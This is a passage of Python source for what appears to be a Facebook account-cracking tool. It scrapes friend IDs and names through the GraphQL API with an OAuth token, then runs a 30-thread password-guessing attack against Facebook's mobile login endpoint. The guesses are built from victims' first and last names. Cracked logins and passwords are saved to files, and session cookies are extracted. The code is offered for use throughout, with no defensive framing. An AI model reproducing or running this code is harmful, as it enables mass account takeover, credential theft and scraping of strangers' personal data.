                    'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
                    'fb_api_caller_class': 'graphservice',
                    'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
                    'client_trace_id': trace_id,
                    'server_timestamps': 'true',
                    'purpose': 'fetch'
                }
                posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
                try:
                    data = posted['data']['user']['friends']['edges']
                except:
                    print(f' \033[1;35mSomething wrong with {uid}\033[0m ')
                if len(data) < 100:
                    print(f' \033[1;31mFriends Are Private {uid}\033[0m ')
                else:
                    for edge in data:
                        node = edge['node']
                        open(save_as, 'a', encoding='utf-8').write(node['id'] + "|" + node['name'] + '\n')
                    try:
                        total_idss=len(open(save_as,'r').readlines())
                    except:
                        total_idss='-'
                    x = random.choice(colors)
                    print(f' {x}Sucessfully extracted {uid} [{total_idss}] \033[0m')
            except KeyError:
                pass
            except requests.exceptions.ConnectionError:
                input(" connection error - press enter to continue")
def file_unlimmited(self):
        os.system('clear');print(logo)
        limit = input(" how many ids you want to add ? ")
        save_as = input(" save file as : ")
        if not save_as == '/sdcard/':
            os.system(f'rm -rf {save_as}')
            open(save_as,'w')
        os.system('clear');print(logo)
        sepr = input(' do you want to seprate ids (y/n) : ')
        if sepr in ['y','Y']:
            sep.append('y')
            print('\n\033[1;92m Example: 100087,100088 etc\033[0;97m')
            try:
                sl = int(input('\n How Many Links To Grab : '))
            except:
                sl = 1
            for el in range(sl):
                sid = input(f' Put {el + 1} link: ')
                siid.append(sid)
        elif sepr in ['n','N']:
            sep.append('n')
        else:
            sep.append('n')
        try:
            file = open('.temp.txt', 'r').read().splitlines()
        except:
            file = []
        os.system('clear');print(logo)
        for i in range(int(limit)):
            uid = input(" put id {} : ".format(i+1))
            try:
                headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
                           "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
                           "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
                           "Authorization": "OAuth " + self.token + "",
                           "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
                           "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
                           "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
                           "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
                           "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
                           "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
                           "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
                           "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
                data = {
                    'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
                    'client_doc_id': client_id,
                    'method': 'post',
                    'locale': 'en_US',
                    'pretty': 'false',
                    'format': 'json',
                    'variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}',
                    'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
                    'fb_api_caller_class': 'graphservice',
                    'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
                    'client_trace_id': trace_id,
                    'server_timestamps': 'true',
                    'purpose': 'fetch'
                }
                posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
                try:
                    data = posted['data']['user']['friends']['edges']
                except:
                    print(f' \033[1;35msomething wrong with {uid}\033[0m ')
                if len(data) < 100:
                    print(f' \033[1;31mfriends are private {uid}\033[0m ')
                else:
                    for edge in data:
                        node = edge['node']
                        open('.a.txt', 'a', encoding='utf-8').write(node['id'] + '\n')
                        idss = len(open('.a.txt','r').readlines())
                    x = random.choice(colors)
                    print(f' {x} sucessfully -> {uid} [{idss}]\033[0m')
            except KeyError:
                pass
            except requests.exceptions.ConnectionError:
                input(" connection error - press enter to continue")
        try:
            file = open('.a.txt', 'r').read().splitlines()
        except:
            file = []
        os.system('clear');print(logo)
        print(' Total ids To Xtract is : ' + str(len(file)))
        print(' Xtracting Is Started Be Patient')
        print(50*'-')
        for uid in file:
            try:
                headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
                           "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
                           "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
                           "Authorization": "OAuth " + self.token + "",
                           "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
                           "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
                           "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
                           "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
                           "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
                           "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
                           "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
                           "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
                data = {
                    'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
                    'client_doc_id': client_id,
                    'method': 'post',
                    'locale': 'en_US',
                    'pretty': 'false',
                    'format': 'json',
                    'variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}',
                    'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
                    'fb_api_caller_class': 'graphservice',
                    'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
                    'client_trace_id': trace_id,
                    'server_timestamps': 'true',
                    'purpose': 'fetch'
                }
                posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
                try:
                    data = posted['data']['user']['friends']['edges']
                except:
                    print(f' \033[1;35msomething wrong with {uid}\033[0m ')
                if len(data) < 100:
                    print(f' \033[1;31mFriends Are Private {uid}\033[0m ')
                else:
                    for edge in data:
                        node = edge['node']
                        open(save_as, 'a', encoding='utf-8').write(node['id'] + "|" + node['name'] + '\n')
                    if 'y' in sep:
                        perfector(save_as)
                    try:
                        total_idss=len(open(save_as,'r').readlines())
                    except:
                        total_idss='-'
                    x = random.choice(colors)
                    print(f' {x}Sucessfully extracted {uid} [{total_idss}] \033[0m')
            except KeyError:
                pass
            except requests.exceptions.ConnectionError:
                input(" connection error - press enter to continue")
        print(50*'-')
        print(' ids save in {} path'.format(save_as))
        print(' Total ids save in file {} '.format(len(open(save_as,'r').read().splitlines())))
        exit(50*'-')
        
#USERAGENTS_RANDOM
"""
Mozilla/5.0 (Linux; Android 6.0.1; SM-G900F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/hr_HR;FBAV/319.0.0.7.107;
Mozilla/5.0 (Linux; Android 5.1.1; 9022X Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;
Mozilla/5.0 (Linux; Android 11; 5033XR Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.115 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]
Mozilla/5.0 (Linux; Android 10; A140 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]
Mozilla/5.0 (Linux; Android 10; BV6600 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]
Mozilla/5.0 (Linux; Android 10; itel A571W Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/333.0.0.12.108;]
Mozilla/5.0 (Linux; Android 11; ZTE Blade L9 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]
"""
####@-----Random-----@####
def andom():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o': 
        tpp = input(f'[+] Total Password? : ')
        totalpass.append('first')
        totalpass.append('last')
        if tpp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'[+] {ex} (ETC)')
            for x in range(int(tpp)):
                totalpass.append(input(f'[1] Password : '))
            pass
        else:
            print(f"[+] Numeric Only")
            exit()
    print(f'\n'+("[1]")+' Method 1 \n'+("[2]")+' Method 2 ')
    m=input(f"[+] Input : ") 
    print('\n'+("[?]")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"[+] Input : ")
    print('\n'+("[?]")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"[+] Input : ")
    os.system("clear")
    print(logo) 
    
    print(f'[+] Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"\033[1;97m[+] Process start your background")
   
    print('\033[1;97m='*49)
   
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;97m[\033[1;97mPROCESS\033[1;97m]\033[1;97m {}-{}  \033[1;97mOK:\033[1;92m{} \033[1;97mCP:\033[1;91m{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = "Mozilla/5.0 (Linux; Android 8.1.0; BBB100-1 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.115 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mRA-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/RA.RANDOM-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mRA-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/RA.RANDOM-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   



 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;97m[\033[1;97mPROCESS\033[1;97m]\033[1;97m {}-{}  \033[1;97mOK:\033[1;92m{} \033[1;97mCP:\033[1;91m{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = "Mozilla/5.0 (Linux; Android 11; Hisense H60 Smart Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mRA-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'  ')
                open('/sdcard/RA.RANDOM-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                    check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;91mRA-CP\033[1;91m] \033[1;91m'+acc+' \033[1;91m•\033[1;91m '+pword)
                cpacc.append(acc)
                open('/sdcard/RA.RANDOM-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

      
    for x in open('.rndm','r').read().splitlines():
        accounts.append(x)
    
    if m=='2':
        with speed(max_workers=30) as speeed:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()




main()
